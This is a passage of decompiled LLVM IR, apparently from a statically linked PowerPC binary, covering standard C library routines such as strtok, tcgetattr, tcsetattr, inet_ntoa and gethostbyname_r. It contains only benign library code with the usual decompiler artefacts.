  %v1_1000a494 = mul nuw nsw i32 %v3_1000a488, 2
  store i32 %v1_1000a494, i32* %r9.global-to-local, align 4
  %v0_1000a498 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a490, i32 %v0_1000a498)
  %v0_1000a49c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a49c = inttoptr i32 %v0_1000a49c to i8*
  %v2_1000a49c = load i8, i8* %v1_1000a49c, align 1
  %v3_1000a49c = zext i8 %v2_1000a49c to i32
  %v1_1000a4a0 = add i32 %v0_1000a49c, 1
  store i32 %v1_1000a4a0, i32* %r8.global-to-local, align 4
  %v0_1000a4a4 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000a4a4 = icmp eq i32 %v0_1000a4a4, %v3_1000a49c
  br i1 %v4_1000a4a4, label %dec_label_pc_1000a488.backedge, label %dec_label_pc_1000a4b0

dec_label_pc_1000a488.backedge:                   ; preds = %dec_label_pc_1000a488, %dec_label_pc_1000a4b0, %dec_label_pc_1000a4c4
  %v0_1000a488.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a488

dec_label_pc_1000a4b0:                            ; preds = %dec_label_pc_1000a488
  %v1_1000a4a8 = mul nuw nsw i32 %v3_1000a49c, 2
  %v0_1000a4b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a4b0 = add i32 %v1_1000a4b0, %v0_1000a4b0
  %v3_1000a4b0 = inttoptr i32 %v2_1000a4b0 to i16*
  %v4_1000a4b0 = load i16, i16* %v3_1000a4b0, align 2
  %v5_1000a4b0 = sext i16 %v4_1000a4b0 to i32
  store i32 %v5_1000a4b0, i32* %r9.global-to-local, align 4
  %v2_1000a4b8 = add i32 %v1_1000a4b0, %v1_1000a4a8
  %v3_1000a4b8 = inttoptr i32 %v2_1000a4b8 to i16*
  %v4_1000a4b8 = load i16, i16* %v3_1000a4b8, align 2
  %v5_1000a4b8 = sext i16 %v4_1000a4b8 to i32
  store i32 %v5_1000a4b8, i32* %r0.global-to-local, align 4
  %v4_1000a4bc = icmp eq i16 %v4_1000a4b0, %v4_1000a4b8
  br i1 %v4_1000a4bc, label %dec_label_pc_1000a488.backedge, label %dec_label_pc_1000a4c4

dec_label_pc_1000a4c4:                            ; preds = %dec_label_pc_1000a4b0
  %v3_1000a4b4 = icmp eq i8 %v2_1000a49c, 0
  %v0_1000a4c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a4c4 = add i32 %v0_1000a4c4, 1
  store i32 %v1_1000a4c4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000a4c4, i32* %r8.global-to-local, align 4
  br i1 %v3_1000a4b4, label %dec_label_pc_1000a4d4, label %dec_label_pc_1000a488.backedge

dec_label_pc_1000a4d4:                            ; preds = %dec_label_pc_1000a4c4
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000a488, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a488.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10024a60.599 to i32), i32* @r5, align 4
  %v1_1000a4e4 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_10024a60.599 to i32))
  ret i32 %v1_1000a4e4
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268477692, i32* @lr, align 4
  %v2_1000a4f8 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a518 = load i32, i32* @lr, align 4
  store i32 %v0_1000a518, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a528 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268477756, i32* @lr, align 4
  %v3_1000a538 = call i32 @ioctl(i32 1076655123, i32 %v2_1000a528, i32 %v2_1000a528)
  %v2_1000a53c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000a53c, i32* @r4, align 4
  store i32 %v3_1000a538, i32* @r30, align 4
  %v3_1000a540 = icmp eq i32 %v3_1000a538, 0
  store i32 19, i32* @r5, align 4
  %v0_1000a548 = load i32, i32* @r31, align 4
  br i1 %v3_1000a540, label %dec_label_pc_1000a550, label %dec_label_pc_1000a598

dec_label_pc_1000a550:                            ; preds = %entry
  %v1_1000a548 = add i32 %v0_1000a548, 17
  %v4_1000a55c = zext i8 %tmp4 to i32
  store i32 %v4_1000a55c, i32* @r8, align 4
  %v3_1000a568 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000a568, i32* %r0.global-to-local, align 4
  %v2_1000a56c = add i32 %v0_1000a548, 4
  %v3_1000a56c = inttoptr i32 %v2_1000a56c to i32*
  store i32 %tmp7, i32* %v3_1000a56c, align 4
  %v0_1000a570 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a570 = load i32, i32* @r31, align 4
  %v2_1000a570 = inttoptr i32 %v1_1000a570 to i32*
  store i32 %v0_1000a570, i32* %v2_1000a570, align 4
  %v0_1000a574 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a574 = load i32, i32* @r31, align 4
  %v2_1000a574 = add i32 %v1_1000a574, 8
  %v3_1000a574 = inttoptr i32 %v2_1000a574 to i32*
  store i32 %v0_1000a574, i32* %v3_1000a574, align 4
  %v0_1000a578 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a578 = load i32, i32* @r31, align 4
  %v2_1000a578 = add i32 %v1_1000a578, 12
  %v3_1000a578 = inttoptr i32 %v2_1000a578 to i32*
  store i32 %v0_1000a578, i32* %v3_1000a578, align 4
  %v3_1000a57c = load i32, i32* @r31, align 4
  %v4_1000a57c = add i32 %v3_1000a57c, 16
  %v5_1000a57c = inttoptr i32 %v4_1000a57c to i8*
  store i8 %tmp4, i8* %v5_1000a57c, align 1
  %v1_1000a580 = load i32, i32* @r31, align 4
  %v2_1000a580 = add i32 %v1_1000a580, 52
  %v3_1000a580 = inttoptr i32 %v2_1000a580 to i32*
  store i32 %tmp3, i32* %v3_1000a580, align 4
  %v1_1000a584 = load i32, i32* @r31, align 4
  %v2_1000a584 = add i32 %v1_1000a584, 56
  %v3_1000a584 = inttoptr i32 %v2_1000a584 to i32*
  store i32 %tmp2, i32* %v3_1000a584, align 4
  store i32 268477836, i32* @lr, align 4
  %v6_1000a588 = sext i8 %tmp4 to i32
  %v8_1000a588 = call i32 @__GI_mempcpy(i32 %v1_1000a548, i32 %v2_1000a53c, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000a588, i32 %tmp7)
  store i32 268477848, i32* @lr, align 4
  %v3_1000a594 = call i32 @__GI_memset(i32 %v8_1000a588, i32 0, i32 13)
  %v0_1000a59c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a598

dec_label_pc_1000a598:                            ; preds = %entry, %dec_label_pc_1000a550
  %v0_1000a59c = phi i32 [ %v3_1000a538, %entry ], [ %v0_1000a59c.pre, %dec_label_pc_1000a550 ]
  store i32 %v0_1000a518, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a59c

; uselistorder directives
  uselistorder i32 %v2_1000a528, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a598, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a5b0 = load i32, i32* @r4, align 4
  %v3_1000a5b0 = icmp eq i32 %v0_1000a5b0, 1
  %v0_1000a5c0 = load i32, i32* @r3, align 4
  store i32 %v0_1000a5c0, i32* @r27, align 4
  %v0_1000a5c8 = load i32, i32* @r5, align 4
  store i32 %v0_1000a5c8, i32* @r31, align 4
  br i1 %v3_1000a5b0, label %dec_label_pc_1000a5ec, label %dec_label_pc_1000a5d0

dec_label_pc_1000a5d0:                            ; preds = %entry
  %v3_1000a5d0 = icmp eq i32 %v0_1000a5b0, 2
  br i1 %v3_1000a5d0, label %dec_label_pc_1000a60c, label %dec_label_pc_1000a5d8

dec_label_pc_1000a5d8:                            ; preds = %dec_label_pc_1000a5d0
  %v3_1000a5d8 = icmp eq i32 %v0_1000a5b0, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000a5d8, label %dec_label_pc_1000a614, label %dec_label_pc_1000a5f8

dec_label_pc_1000a5ec:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000a614

dec_label_pc_1000a5f8:                            ; preds = %dec_label_pc_1000a5d8
  %v0_1000a5f8 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000a604 = inttoptr i32 %v0_1000a5f8 to i32*
  store i32 22, i32* %v2_1000a604, align 4
  br label %dec_label_pc_1000a6fc

dec_label_pc_1000a60c:                            ; preds = %dec_label_pc_1000a5d0
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000a614

dec_label_pc_1000a614:                            ; preds = %dec_label_pc_1000a5d8, %dec_label_pc_1000a5ec, %dec_label_pc_1000a60c
  %v1_1000a614 = inttoptr i32 %v0_1000a5c8 to i32*
  %v2_1000a614 = load i32, i32* %v1_1000a614, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000a61c = add i32 %v0_1000a5c8, 4
  %v2_1000a61c = inttoptr i32 %v1_1000a61c to i32*
  %v3_1000a61c = load i32, i32* %v2_1000a61c, align 4
  store i32 %v3_1000a61c, i32* %r9.global-to-local, align 4
  %v1_1000a620 = add i32 %v0_1000a5c8, 17
  store i32 %v1_1000a620, i32* @r4, align 4
  %v1_1000a624 = add i32 %v0_1000a5c8, 8
  %v2_1000a624 = inttoptr i32 %v1_1000a624 to i32*
  %v3_1000a624 = load i32, i32* %v2_1000a624, align 4
  %v2_1000a628 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000a628, i32* @r3, align 4
  %v2_1000a630 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000a630, i32* @r26, align 4
  %v1_1000a634 = add i32 %v0_1000a5c8, 16
  %v2_1000a634 = inttoptr i32 %v1_1000a634 to i8*
  %v3_1000a634 = load i8, i8* %v2_1000a634, align 1
  %v4_1000a634 = zext i8 %v3_1000a634 to i32
  store i32 %v4_1000a634, i32* @r8, align 4
  store i32 %v2_1000a614, i32* %stack_var_-72, align 4
  store i32 268478048, i32* @lr, align 4
  %v0_1000a65c = call i32 @memcpy()
  %v0_1000a660 = load i32, i32* @r27, align 4
  %v0_1000a664 = load i32, i32* @r30, align 4
  store i32 268478068, i32* @lr, align 4
  %v3_1000a670 = call i32 @ioctl(i32 %v0_1000a660, i32 %v0_1000a664, i32 %v2_1000a630)
  store i32 %v3_1000a670, i32* @r28, align 4
  %v3_1000a674 = icmp eq i32 %v3_1000a670, 0
  br i1 %v3_1000a674, label %dec_label_pc_1000a67c, label %dec_label_pc_1000a6fc

dec_label_pc_1000a67c:                            ; preds = %dec_label_pc_1000a614
  %v0_1000a67c = load i32, i32* @r30, align 4
  %v3_1000a680 = icmp eq i32 %v0_1000a67c, -2144570348
  br i1 %v3_1000a680, label %dec_label_pc_1000a688, label %dec_label_pc_1000a6f8

dec_label_pc_1000a688:                            ; preds = %dec_label_pc_1000a67c
  %v0_1000a688 = call i32 @__errno_location()
  store i32 %v0_1000a688, i32* @r29, align 4
  %v0_1000a698 = load i32, i32* @r27, align 4
  %v1_1000a6a0 = inttoptr i32 %v0_1000a688 to i32*
  %v2_1000a6a0 = load i32, i32* %v1_1000a6a0, align 4
  store i32 %v2_1000a6a0, i32* @r30, align 4
  store i32 268478124, i32* @lr, align 4
  %v3_1000a6a8 = call i32 @ioctl(i32 %v0_1000a698, i32 1076655123, i32 %v2_1000a630)
  %v3_1000a6ac = icmp eq i32 %v3_1000a6a8, 0
  br i1 %v3_1000a6ac, label %dec_label_pc_1000a6bc, label %dec_label_pc_1000a6b4

dec_label_pc_1000a6b4:                            ; preds = %dec_label_pc_1000a688
  %v0_1000a6b4 = load i32, i32* @r30, align 4
  %v1_1000a6b4 = load i32, i32* @r29, align 4
  %v2_1000a6b4 = inttoptr i32 %v1_1000a6b4 to i32*
  store i32 %v0_1000a6b4, i32* %v2_1000a6b4, align 4
  br label %dec_label_pc_1000a6fc

dec_label_pc_1000a6bc:                            ; preds = %dec_label_pc_1000a688
  %v0_1000a6bc = load i32, i32* @r31, align 4
  %v1_1000a6bc = add i32 %v0_1000a6bc, 8
  %v2_1000a6bc = inttoptr i32 %v1_1000a6bc to i32*
  %v3_1000a6bc = load i32, i32* %v2_1000a6bc, align 4
  %v1_1000a6c4 = call i32 @__asm_rlwinm(i32 %v3_1000a6bc, i32 0, i32 19, i32 20)
  %v1_1000a6c8 = call i32 @__asm_rlwinm(i32 %v3_1000a624, i32 0, i32 19, i32 20)
  store i32 %v1_1000a6c8, i32* %r9.global-to-local, align 4
  %v4_1000a6cc = icmp eq i32 %v1_1000a6c4, %v1_1000a6c8
  br i1 %v4_1000a6cc, label %dec_label_pc_1000a6d4, label %dec_label_pc_1000a6e8

dec_label_pc_1000a6d4:                            ; preds = %dec_label_pc_1000a6bc
  %v1_1000a6d4 = and i32 %v3_1000a6bc, 768
  store i32 %v1_1000a6d4, i32* %r9.global-to-local, align 4
  %v3_1000a6d4 = icmp eq i32 %v1_1000a6d4, 0
  br i1 %v3_1000a6d4, label %dec_label_pc_1000a6f8, label %dec_label_pc_1000a6dc

dec_label_pc_1000a6dc:                            ; preds = %dec_label_pc_1000a6d4
  %v1_1000a6dc = call i32 @__asm_rlwinm(i32 %v3_1000a624, i32 0, i32 22, i32 23)
  %v0_1000a6e0 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000a6e0 = icmp eq i32 %v0_1000a6e0, %v1_1000a6dc
  br i1 %v4_1000a6e0, label %dec_label_pc_1000a6f8, label %dec_label_pc_1000a6e8

dec_label_pc_1000a6e8:                            ; preds = %dec_label_pc_1000a6bc, %dec_label_pc_1000a6dc
  store i32 -1, i32* @r28, align 4
  %v1_1000a6f0 = load i32, i32* @r29, align 4
  %v2_1000a6f0 = inttoptr i32 %v1_1000a6f0 to i32*
  store i32 22, i32* %v2_1000a6f0, align 4
  br label %dec_label_pc_1000a6fc

dec_label_pc_1000a6f8:                            ; preds = %dec_label_pc_1000a67c, %dec_label_pc_1000a6dc, %dec_label_pc_1000a6d4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000a6fc

dec_label_pc_1000a6fc:                            ; preds = %dec_label_pc_1000a614, %dec_label_pc_1000a6b4, %dec_label_pc_1000a5f8, %dec_label_pc_1000a6e8, %dec_label_pc_1000a6f8
  %v0_1000a700 = load i32, i32* @r28, align 4
  ret i32 %v0_1000a700

; uselistorder directives
  uselistorder i32 %v0_1000a5c8, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 4, 5, 6, 0, 7, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a6fc, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a6f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a6e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a614, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000a714 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a714
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000a718 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a718
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000a71c = load i32, i32* @r3, align 4
  ret i32 %v0_1000a71c
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000a720 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a720
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000a72c = add i32 %arg2, 15
  store i32 %v1_1000a72c, i32* %r4.global-to-local, align 4
  %v2_1000a740 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a740, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a748

dec_label_pc_1000a748:                            ; preds = %dec_label_pc_1000a76c.dec_label_pc_1000a748_crit_edge, %entry
  %v0_1000a748 = phi i32 [ %v2_1000a740, %entry ], [ %v0_1000a748.pre, %dec_label_pc_1000a76c.dec_label_pc_1000a748_crit_edge ]
  %v0_1000a78c8 = phi i32 [ %v1_1000a72c, %entry ], [ %v0_1000a76c, %dec_label_pc_1000a76c.dec_label_pc_1000a748_crit_edge ]
  %v1_1000a748 = urem i32 %v0_1000a748, 256
  %v5_1000a750 = inttoptr i32 %v0_1000a78c8 to i8*
  %v6_1000a750 = call i32 @_uintmaxtostr(i8* %v5_1000a750, i32 0, i32 %v1_1000a748, i32 -10, i32 0)
  %v0_1000a754 = load i32, i32* @r30, align 4
  %v3_1000a754 = icmp eq i32 %v0_1000a754, 0
  %v0_1000a758 = load i32, i32* @r31, align 4
  %v1_1000a758 = udiv i32 %v0_1000a758, 256
  store i32 %v1_1000a758, i32* %r31.global-to-local, align 4
  %v1_1000a75c = add i32 %v6_1000a750, -1
  store i32 %v1_1000a75c, i32* %r4.global-to-local, align 4
  br i1 %v3_1000a754, label %dec_label_pc_1000a76c, label %dec_label_pc_1000a764

dec_label_pc_1000a764:                            ; preds = %dec_label_pc_1000a748
  %v3_1000a768 = inttoptr i32 %v0_1000a754 to i8*
  store i8 46, i8* %v3_1000a768, align 1
  %v0_1000a76c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a76c

dec_label_pc_1000a76c:                            ; preds = %dec_label_pc_1000a748, %dec_label_pc_1000a764
  %v0_1000a76c = phi i32 [ %v1_1000a75c, %dec_label_pc_1000a748 ], [ %v0_1000a76c.pre, %dec_label_pc_1000a764 ]
  %v0_1000a770.pre = load i32, i32* @r29, align 4
  %v1_1000a780 = add i32 %v0_1000a770.pre, 1
  store i32 %v1_1000a780, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000a770.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000a76c.dec_label_pc_1000a748_crit_edge, label %dec_label_pc_1000a788

dec_label_pc_1000a76c.dec_label_pc_1000a748_crit_edge: ; preds = %dec_label_pc_1000a76c
  %v0_1000a748.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a748

dec_label_pc_1000a788:                            ; preds = %dec_label_pc_1000a76c
  %v1_1000a78c = add i32 %v0_1000a76c, 1
  ret i32 %v1_1000a78c

; uselistorder directives
  uselistorder i32 %v0_1000a770.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a76c, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000a7b4 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a7b4, i32* %stack_var_-8, align 4
  store i32 268478404, i32* @lr, align 4
  %v3_1000a7c0 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_1002aac0.600 to i32))
  ret i32 %v3_1000a7c0
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000a7dc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000a7dc, i32* @r4, align 4
  store i32 268478440, i32* @lr, align 4
  %v1_1000a7e4 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000a7e4 = call i32 @inet_aton(i8* %v1_1000a7e4)
  %v3_1000a7e8 = icmp eq i32 %v2_1000a7e4, 0
  br i1 %v3_1000a7e8, label %dec_label_pc_1000a7f8, label %dec_label_pc_1000a7f4

dec_label_pc_1000a7f4:                            ; preds = %entry
  %v3_1000a7f4 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000a7f8

dec_label_pc_1000a7f8:                            ; preds = %entry, %dec_label_pc_1000a7f4
  %v0_1000a804 = phi i32 [ -1, %entry ], [ %v3_1000a7f4, %dec_label_pc_1000a7f4 ]
  ret i32 %v0_1000a804

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a7f8, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000a81c = call i32 @__GI___h_errno_location()
  %v2_1000a82c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268478532, i32* @lr, align 4
  %v7_1000a840 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1002ac9c.601, i32 ptrtoint (i32* @global_var_1002aad0.602 to i32), i32 460, i32 %v2_1000a82c, i32 %v0_1000a81c)
  %v3_1000a848 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000a848
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000a860 = load i32, i32* @lr, align 4
  store i32 %v0_1000a860, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000a868 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000a888 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000a888, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000a868, label %dec_label_pc_1000ab8c, label %dec_label_pc_1000a894

dec_label_pc_1000a894:                            ; preds = %entry
  %v0_1000a894 = call i32 @__errno_location()
  store i32 %v0_1000a894, i32* %r3.global-to-local, align 4
  %v1_1000a89c = inttoptr i32 %v0_1000a894 to i32*
  %v2_1000a89c = load i32, i32* %v1_1000a89c, align 4
  store i32 %v2_1000a89c, i32* @r27, align 4
  store i32 %v0_1000a894, i32* %r28.global-to-local, align 4
  %v0_1000a8a4 = load i32, i32* @r31, align 4
  store i32 %v0_1000a8a4, i32* %v1_1000a89c, align 4
  %v0_1000a8a8 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000a8ac = load i32, i32* @r23, align 4
  store i32 %v0_1000a8ac, i32* %r3.global-to-local, align 4
  %v0_1000a8b0 = load i32, i32* %r30.global-to-local, align 4
  %v0_1000a8b4 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000a8b8 = load i32, i32* %r20.global-to-local, align 4
  %v0_1000a8bc = load i32, i32* @r24, align 4
  store i32 268478660, i32* @lr, align 4
  %v7_1000a8c0 = call i32 @__get_hosts_byname_r(i32 %v0_1000a8ac, i32 2, i32 %v0_1000a8a8, i32 %v0_1000a8b0, i32 %v0_1000a8b4, i32 %v0_1000a8b8, i32 %v0_1000a8bc)
  store i32 %v7_1000a8c0, i32* %r3.global-to-local, align 4
  %v3_1000a8c4 = icmp eq i32 %v7_1000a8c0, 0
  br i1 %v3_1000a8c4, label %dec_label_pc_1000ab8c, label %dec_label_pc_1000a8cc

dec_label_pc_1000a8cc:                            ; preds = %dec_label_pc_1000a894
  %v0_1000a8cc = load i32, i32* @r24, align 4
  %v1_1000a8cc = inttoptr i32 %v0_1000a8cc to i32*
  %v2_1000a8cc = load i32, i32* %v1_1000a8cc, align 4
  store i32 %v2_1000a8cc, i32* %r0.global-to-local, align 4
  %v3_1000a8d0 = icmp eq i32 %v2_1000a8cc, 1
  br i1 %v3_1000a8d0, label %dec_label_pc_1000a8f4, label %dec_label_pc_1000a8d8

dec_label_pc_1000a8d8:                            ; preds = %dec_label_pc_1000a8cc
  %v3_1000a8d8 = icmp eq i32 %v2_1000a8cc, 4
  br i1 %v3_1000a8d8, label %dec_label_pc_1000a8f4, label %dec_label_pc_1000a8e0

dec_label_pc_1000a8e0:                            ; preds = %dec_label_pc_1000a8d8
  %v3_1000a8e0 = icmp eq i32 %v2_1000a8cc, -1
  br i1 %v3_1000a8e0, label %dec_label_pc_1000a8e8, label %dec_label_pc_1000ab8c

dec_label_pc_1000a8e8:                            ; preds = %dec_label_pc_1000a8e0
  %v0_1000a8e8 = load i32, i32* @r28, align 4
  %v1_1000a8e8 = inttoptr i32 %v0_1000a8e8 to i32*
  %v2_1000a8e8 = load i32, i32* %v1_1000a8e8, align 4
  store i32 %v2_1000a8e8, i32* %r0.global-to-local, align 4
  %v3_1000a8ec = icmp eq i32 %v2_1000a8e8, 2
  br i1 %v3_1000a8ec, label %dec_label_pc_1000a8f4, label %dec_label_pc_1000ab8c

dec_label_pc_1000a8f4:                            ; preds = %dec_label_pc_1000a8e8, %dec_label_pc_1000a8d8, %dec_label_pc_1000a8cc
  %v0_1000a8f4 = load i32, i32* @r30, align 4
  %v1_1000a8f4 = sub i32 0, %v0_1000a8f4
  store i32 %v1_1000a8f4, i32* %r0.global-to-local, align 4
  %v0_1000a8f8 = load i32, i32* @r27, align 4
  %v1_1000a8f8 = load i32, i32* @r28, align 4
  %v2_1000a8f8 = inttoptr i32 %v1_1000a8f8 to i32*
  store i32 %v0_1000a8f8, i32* %v2_1000a8f8, align 4
  %v0_1000a8fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a8fc = urem i32 %v0_1000a8fc, 4
  store i32 %v1_1000a8fc, i32* %r0.global-to-local, align 4
  %v3_1000a8fc = icmp eq i32 %v1_1000a8fc, 0
  %v0_1000a914.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000a8fc, label %dec_label_pc_1000a914, label %dec_label_pc_1000a904

dec_label_pc_1000a904:                            ; preds = %dec_label_pc_1000a8f4
  %v2_1000a904 = icmp ult i32 %v0_1000a914.pre, %v1_1000a8fc
  br i1 %v2_1000a904, label %dec_label_pc_1000ab88, label %dec_label_pc_1000a90c

dec_label_pc_1000a90c:                            ; preds = %dec_label_pc_1000a904
  %v2_1000a90c = sub i32 %v0_1000a914.pre, %v1_1000a8fc
  store i32 %v2_1000a90c, i32* @r29, align 4
  %v0_1000a910 = load i32, i32* @r30, align 4
  %v2_1000a910 = add i32 %v0_1000a910, %v1_1000a8fc
  store i32 %v2_1000a910, i32* @r30, align 4
  br label %dec_label_pc_1000a914

dec_label_pc_1000a914:                            ; preds = %dec_label_pc_1000a8f4, %dec_label_pc_1000a90c
  %v0_1000a914 = phi i32 [ %v2_1000a90c, %dec_label_pc_1000a90c ], [ %v0_1000a914.pre, %dec_label_pc_1000a8f4 ]
  %v1_1000a91c = load i32, i32* @r24, align 4
  %v2_1000a91c = inttoptr i32 %v1_1000a91c to i32*
  store i32 -1, i32* %v2_1000a91c, align 4
  %tmp29 = icmp ult i32 %v0_1000a914, 4
  br i1 %tmp29, label %dec_label_pc_1000ab88, label %dec_label_pc_1000a924

dec_label_pc_1000a924:                            ; preds = %dec_label_pc_1000a914
  %v0_1000a924 = load i32, i32* @r29, align 4
  %v1_1000a924 = add i32 %v0_1000a924, -4
  store i32 %v1_1000a924, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000a924, 8
  br i1 %tmp30, label %dec_label_pc_1000ab88, label %dec_label_pc_1000a930

